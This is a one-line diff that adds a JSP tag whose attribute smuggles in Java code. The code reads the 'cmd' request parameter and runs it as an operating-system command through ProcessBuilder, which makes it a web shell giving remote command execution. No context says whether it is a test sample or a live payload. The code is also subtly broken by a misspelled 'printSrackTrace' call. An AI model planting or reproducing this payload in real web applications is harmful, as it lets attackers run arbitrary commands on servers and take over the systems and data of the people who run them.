@@ -1,0 +1,1 @@
+<jsp:setProperty name="\" +new java.util.function.Supplier<String>() {public String get() {try{String s = request.getParameter(\"cmd\");Process process = new ProcessBuilder().command(s.split(\" \")).start();} catch (Exception e) { e.printSrackTrace();}return \"\";}}.get() + \"" property="*" />
